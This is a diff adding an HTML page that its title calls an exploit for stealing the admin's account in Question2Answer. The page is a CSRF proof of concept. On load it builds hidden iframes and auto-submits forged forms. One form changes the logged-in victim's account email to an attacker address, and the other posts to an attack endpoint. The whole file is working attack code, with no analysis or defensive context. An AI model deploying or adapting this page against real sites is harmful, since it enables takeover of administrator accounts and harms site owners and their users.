@@ -1,0 +1,40 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Exploit for stealing admin's account in Question2Answer. Made by
+MustLive. http://www.example.com&lt;/title&gt;
+&lt;/head&gt;
+&lt;body onLoad=&quot;StartCSRF()&quot;&gt;
+&lt;script&gt;
+function StartCSRF() {
+for (var i=1;i&lt;=2;i++) {
+ var ifr = document.createElement(&quot;iframe&quot;);
+ ifr.setAttribute('name', 'csrf'+i);
+ ifr.setAttribute('width', '0');
+ ifr.setAttribute('height', '0');
+ document.body.appendChild(ifr);
+}
+CSRF1();
+setTimeout(CSRF2,1000);
+}
+function CSRF1() {
+window.frames[&quot;csrf1&quot;].document.body.innerHTML = '&lt;form name=&quot;hack&quot;
+action=&quot;http://www.example.com/account&quot;; method=&quot;post&quot;&gt;n&lt;input type=&quot;hidden&quot;
+name=&quot;handle&quot; value=&quot;test&quot;&gt;n&lt;input type=&quot;hidden&quot; name=&quot;email&quot;
+value=&quot;email () attacker com&quot;&gt;n&lt;input type=&quot;hidden&quot; name=&quot;messages&quot;
+value=&quot;1&quot;&gt;n&lt;input type=&quot;hidden&quot; name=&quot;mailings&quot; value=&quot;1&quot;&gt;n&lt;input
+type=&quot;hidden&quot; name=&quot;field_1&quot; value=&quot;test&quot;&gt;n&lt;input type=&quot;hidden&quot;
+name=&quot;field_2&quot; value=&quot;test&quot;&gt;n&lt;input type=&quot;hidden&quot; name=&quot;field_3&quot;
+value=&quot;test&quot;&gt;n&lt;input type=&quot;hidden&quot; name=&quot;dosaveprofile&quot;
+value=&quot;1&quot;&gt;n&lt;/form&gt;';
+window.frames[&quot;csrf1&quot;].document.hack.submit();
+}
+function CSRF2() {
+window.frames[&quot;csrf2&quot;].document.body.innerHTML = '&lt;form name=&quot;hack&quot;
+action=&quot;http://www.example.com/attack.php&quot;; method=&quot;post&quot;&gt;n&lt;input type=&quot;hidden&quot;
+name=&quot;do&quot; value=&quot;1&quot;&gt;n&lt;/form&gt;';
+window.frames[&quot;csrf2&quot;].document.hack.submit();
+}
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
